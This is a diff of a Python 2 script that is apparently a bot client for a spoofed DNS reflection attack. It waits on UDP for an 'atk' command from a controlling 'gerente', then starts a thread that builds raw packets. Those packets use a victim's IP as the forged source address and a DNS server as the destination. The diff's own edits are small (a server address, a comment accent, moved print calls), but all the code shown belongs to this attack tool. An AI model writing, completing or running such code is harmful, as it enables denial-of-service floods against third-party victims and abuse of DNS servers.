@@ -6,7 +6,7 @@ import sys
 import time
 from random import randint
 from struct import *
-serverName = 'DESKTOP-OOVUV0L'
+serverName = '192.168.0.102'
 serverPort = 12000
 clientSocket = socket(AF_INET, SOCK_DGRAM)
 
@@ -29,7 +29,7 @@ def Ataque():
     # now start constructing the packet
     packet = '';
 
-    source_ip = '192.168.0.102' # vítima do ataque
+    source_ip = '192.168.0.102' # vitima do ataque
     dest_ip = '192.168.0.106'  # servidor DNS
 
     # ip header fields
@@ -99,8 +99,8 @@ def ThreadEnvio():
     ATACANDO = False
     t = threading.Thread(target = Ataque, args=())
     t.daemon = True 
+    print 'Tentando conectar-se ao gerente'
     while True:
-        print 'Tentando conectar-se ao gerente'
         try:
             rcv, serverAddress = clientSocket.recvfrom(2048) 
         except error, e:
@@ -112,7 +112,6 @@ def ThreadEnvio():
             print 'Conectado ao gerente'
 
         if rcv == 'atk':
-            print 'Iniciando ataque'
             ATACANDO = True
             if t.isAlive() == False:
                 t.start();
